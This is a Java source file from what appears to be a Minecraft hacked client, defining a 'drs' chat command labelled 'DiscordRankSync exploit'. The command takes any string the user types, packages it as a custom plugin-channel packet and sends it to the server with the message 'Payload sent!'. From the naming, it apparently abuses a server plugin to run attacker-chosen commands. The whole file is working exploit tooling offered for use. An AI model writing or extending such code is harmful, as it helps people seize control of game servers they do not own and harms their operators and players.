package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.CommandSource;
import net.minecraft.Packet;
import net.minecraft.CustomPayloadC2SPacket;
import net.minecraft.MinecraftClient;
import net.minecraft.CustomPayload;
import io.github.spigotrce.paradiseclientprivate.writer.DiscordRankSyncWriter;

public class DiscordRankSync extends Command {
    public DiscordRankSync(MinecraftClient minecraftClient) {
        super("drs", "DiscordRankSync exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return (DiscordRankSync.literal(this.getName()).executes(this::build)).then(DiscordRankSync.argument("command", StringArgumentType.greedyString()).executes(context -> {
            Helper.sendPacket(new CustomPayloadC2SPacket(new DiscordRankSyncWriter(context.getArgument("command", String.class))));
            Helper.printChatMessage("Payload sent!");
            return 1;
        }));
    }

    private int build(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
